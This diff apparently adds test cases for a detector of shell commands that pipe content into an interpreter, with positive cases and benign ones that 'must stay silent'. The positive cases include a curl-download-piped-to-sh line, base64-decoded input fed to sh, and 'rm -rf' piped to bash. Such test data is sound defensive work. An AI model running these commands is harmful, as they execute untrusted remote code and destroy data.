@@ -1,0 +1,48 @@
+# line 8: a shell fed by a pipe
+curl -fsSL https://x.example/i.sh | sh
+gunzip -c x.gz | bash
+tail -n +2 f | sh
+tee < f | bash
+cat run.sh | bash
+cat run.sh | sudo bash
+cat run.sh | env bash
+cat run.sh | /bin/bash
+cat run.sh | bash -s
+cat run.sh | bash -s -- a b
+cat run.sh | bash -x
+cat run.sh | bash /dev/stdin
+cat run.sh | fish
+cat run.sh | ash
+cat run.sh | busybox sh
+cat run.sh | sh -
+cat run.sh | timeout 5 bash
+cat run.sh | nohup bash
+cat run.sh | GBASH
+cat run.sh | BASH
+cat run.sh | python3
+cat run.sh | python3 -
+cat run.sh | perl
+cat run.sh | node
+cat run.sh | zsh -i
+cat run.sh |& bash
+cat run.sh | tee log | bash
+git show HEAD:run.sh | bash
+pbpaste | bash
+xclip -o | sh
+base64 -d x | sh
+cat run.sh | xargs -0 bash -c
+echo 'rm -rf x' | bash
+printf 'rm -rf x' | bash
+cat <<'EOF' | bash
+"cat <<'EOF' | bash\nrm -rf x\nEOF"
+"cat run.sh <<'EOF' | bash\nls\nEOF"
+# reverse: must stay silent
+bash run.sh
+cat data.txt | bash process.sh
+yes | bash install.sh
+cat run.sh | grep bash
+cat run.sh | bash -c 'wc -l'
+ls | xargs bash x.sh
+cat f | bash -n run.sh
+cat run.sh | ssh h bash
+cat run.sh | docker exec -i c bash
